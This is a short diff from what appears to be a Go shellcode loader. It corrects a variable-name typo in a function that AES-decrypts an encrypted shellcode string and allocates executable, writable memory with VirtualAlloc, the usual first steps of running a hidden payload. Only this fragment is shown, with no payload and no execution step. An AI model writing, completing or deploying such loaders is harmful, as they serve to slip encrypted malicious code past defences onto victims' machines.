@@ -61,7 +61,7 @@ var (
 
 func loaderRun(key string, shellCodeAesBast64 string) {
 
-	shellcode, _ := AesDecrypt(shellcodeAesBast64, []byte(key))
+	shellcode, _ := AesDecrypt(shellCodeAesBast64, []byte(key))
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if err != nil {
 		log.Println(err)
